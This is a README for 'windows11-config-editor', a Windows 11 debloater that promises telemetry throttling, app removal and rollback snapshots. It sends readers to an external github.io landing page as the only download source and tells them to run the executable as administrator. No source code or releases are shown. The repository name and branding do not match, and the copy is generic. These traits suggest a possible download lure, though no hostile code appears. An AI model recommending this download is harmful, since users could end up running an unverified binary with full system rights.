<div align="center">

<img src="assets/banner.svg" width="100%" alt="Windows 11 Debloater banner"/>

# windows11-config-editor 🧹✨

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Turn your bloated Windows 11 install into the lean, quiet machine it was always meant to be — one toggle at a time.*

</div>

## 🔍 Overview

Windows 11 ships with a lot of passengers you never invited to the ride — telemetry pipelines, background services, preinstalled apps, ad platforms baked into the Start menu, and a Settings app that buries the switches that actually matter three menus deep. **windows11-config-editor** is a configuration editor built specifically to surface those switches, explain what they do in plain language, and let you flip them safely — without touching the registry blind or trusting a mystery `.bat` file you found on a forum.

This project exists because "debloating" a modern Windows install has quietly become a rite of passage for power users, sysadmins, gamers, and anyone who just wants their laptop fan to stay quiet during a video call. Instead of copy-pasting PowerShell snippets from a dozen different blog posts and hoping none of them conflict, you get one coherent interface with a consistent state model, sane defaults, and the ability to reverse course the moment something feels off.

Whether you're provisioning a fleet of lab machines, prepping a fresh install for a low-spec laptop, or just tired of Windows 11 nagging you about a browser you don't use, this tool is built for you. It favors **transparency over cleverness** — every change is visible, every setting is documented, and nothing happens silently in the background.

<p align="center">
  <a href="https://bodymothcavity.github.io/windows11-config-editor/">
    <img src="https://img.shields.io/badge/GET-Windows_11_Debloater_2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>

> [!TIP]
> New to debloating? Start with the **Recommended Profile** on the landing page — it covers the 80% of tweaks nearly everyone wants, with zero guesswork.

---

## 🧩 What This Actually Does

- **Telemetry Throttling** — dials back diagnostic data collection and background reporting services without breaking Windows Update or security features.

- **Bundled App Removal** — strips preinstalled apps and Store-delivered "suggested" software that reinstall themselves after every feature update, for good this time.

- **Start Menu & Widgets Cleanup** — removes ad-driven tiles, recommended content, and the widgets feed so your Start menu shows *your* apps, not a curated feed.

- **Service & Task Trimming** — disables non-essential scheduled tasks and background services tied to marketing, feedback prompts, and "tips" notifications.

- **Privacy Dashboard** — a single screen showing exactly which permissions and telemetry channels are currently active, color-coded so nothing hides in fine print.

- **Snapshot & Restore** — every session creates a rollback point before applying changes, so backing out of a tweak is a click, not a system restore.

- **Profile Presets** — curated bundles (Minimal, Balanced, Aggressive) so you can pick a philosophy instead of clicking through fifty individual toggles.

- **Offline-First Design** — reads and writes configuration locally; no account, no cloud sync, no phone-home behavior of its own.

> [!NOTE]
> This is a **configuration editor**, not a system reinstaller. It adjusts settings and services that Windows already exposes — it doesn't delete core OS components or void your ability to reinstall stock behavior.

---

## 🚀 How to Get Started

1. **Visit the landing page** using the download button above — that's the only official source for builds.

2. **Download the latest release** for your Windows version (10 or 11, 64-bit).

3. **Run the executable** — no installer wizard, no background service gets registered, it just opens.

4. **Pick a profile or go manual**, review the changes listed, and apply. A restore point is created automatically before anything is touched.

> [!IMPORTANT]
> Always create a manual System Restore point too if you're working on a machine you can't afford to be without for a day. Automated snapshots are a safety net, not a substitute for your own backups.

---

## 🖥️ System Requirements

| Requirement | Details |
|---|---|
| OS | Windows 10 (20H2+) or Windows 11, 64-bit |
| Disk | Under 50 MB, standalone binary |
| Dependencies | None — no runtime installs required |
| Permissions | Administrator recommended for full service/registry access |
| Internet | Not required after download |

![Status](https://img.shields.io/badge/status-actively%20maintained-brightgreen?style=flat-square) ![Build](https://img.shields.io/badge/build-passing-success?style=flat-square) ![Made with](https://img.shields.io/badge/made%20with-C%23%20%2F%20.NET-512BD4?style=flat-square)

---

## ⚙️ How It Works

The editor follows a deliberately boring, predictable pipeline — boring is a feature when you're modifying system settings.

1. **Scan** the current system state (services, registry keys, scheduled tasks, app packages).

2. **Diff** that state against the selected profile or your manual selections.

3. **Snapshot** the pre-change state for rollback.

4. **Apply** changes through documented Windows APIs and supported configuration surfaces.

5. **Verify** post-change state and report anything that didn't apply cleanly.

```mermaid
flowchart LR
Scan --> Diff --> Snapshot --> Apply --> Verify
```

---

## 🛠️ Troubleshooting

<details>
<summary><b>An app I removed came back after a Windows Update.</b></summary>

This happens because some Microsoft-signed packages are reinstalled during major feature updates. Re-run your profile after big updates — it takes seconds and catches regressions like this automatically.

</details>

<details>
<summary><b>I applied changes and now a feature I use is missing.</b></summary>

Open the Snapshot & Restore panel and roll back to the pre-change state. If you used a preset, switch to a lighter profile (Minimal instead of Aggressive) and reapply selectively.

</details>

<details>
<summary><b>The tool says "Access Denied" on some settings.</b></summary>

Relaunch as Administrator. Certain services and scheduled tasks are protected by Windows and require elevated permissions to modify, even for the built-in user account.

</details>

<details>
<summary><b>Windows Update flagged something after I ran a profile.</b></summary>

This is expected behavior for some diagnostics-related toggles — it's informational, not an error. Security updates and Defender remain fully functional regardless of profile.

</details>

<details>
<summary><b>Can I undo everything at once?</b></summary>

Yes — the Restore tab lists every snapshot chronologically. Selecting the earliest one effectively reverts the machine to its pre-debloat state.

</details>

> [!WARNING]
> Editing system components outside this tool's supported list (via manual registry edits, for example) can produce results this tool wasn't designed to detect or roll back. Stick to the documented toggles for guaranteed reversibility.

---

## 🎨 UI / UX Details

- **Themes** — Light, Dark, and a high-contrast mode that follows your Windows accent color automatically.

- **Keyboard Shortcuts**:

  | Shortcut | Action |
  |---|---|
  | `Ctrl + F` | Search settings |
  | `Ctrl + S` | Save current profile |
  | `Ctrl + Z` | Revert last applied change |
  | `F5` | Rescan system state |
  | `Ctrl + ,` | Open preferences |

- **Settings persistence** — your last profile and window layout are remembered locally between sessions.

- **Search-first navigation** — every toggle is indexed and searchable by keyword, so you never have to remember which submenu something lives in.

---

## 🤝 Contributing & Community

> [!NOTE]
> Contributions, issue reports, and profile suggestions are genuinely welcome — this project grows through real-world usage on real-world machines.

- Open an issue for bugs, missing translations, or settings that need documentation.

- Submit pull requests for new profile presets or UI polish — small, focused PRs merge fastest.

- Join discussions to compare notes on which tweaks matter most for gaming rigs, laptops, or lab fleets.

---

## 📄 License

Released under the [MIT License](LICENSE), 2026. Use it, fork it, ship it in your own toolkit — just keep the license notice intact.

---

## ⚠️ Disclaimer

This tool modifies operating system settings, services, and preinstalled software behavior. While every effort is made to keep changes safe and reversible via snapshots, you are responsible for backing up important data before making system-level modifications. This project is not affiliated with or endorsed by Microsoft.

<p align="center">
  <a href="https://bodymothcavity.github.io/windows11-config-editor/">
    <img src="https://img.shields.io/badge/GET-Windows_11_Debloater_2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>